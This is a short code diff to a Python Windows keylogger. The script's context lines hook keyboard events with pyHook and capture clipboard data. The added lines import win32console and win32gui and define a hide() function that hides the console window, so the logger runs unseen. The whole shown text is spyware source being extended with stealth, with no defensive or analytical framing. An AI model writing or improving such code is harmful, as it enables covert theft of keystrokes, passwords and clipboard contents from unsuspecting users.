@@ -9,6 +9,7 @@ import pyHook           #h0oking to keyboard events
 import win32clipboard   #to capture clipboard data
 import time     
 import threading        # for threading
+import win32console,win32gui
 
 user32=windll.user32
 kernel32=windll.kernel32
@@ -16,6 +17,10 @@ psapi=windll.psapi
 
 currentwindow=None
 edata=None
+def hide():
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
+    return True
 def controller(): #file controller
     global edata
     while 1>0:
